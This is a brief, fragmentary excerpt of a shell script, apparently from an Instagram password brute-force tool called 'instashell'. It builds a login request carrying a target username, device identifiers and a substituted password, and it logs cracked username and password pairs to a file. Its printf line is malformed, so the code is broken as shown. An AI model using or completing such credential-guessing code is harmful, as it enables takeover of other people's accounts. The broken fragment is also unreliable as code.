...
data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"kenswqq", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
...
printf "Username: %s, Password:12345678 $user $pass >> found.instashell
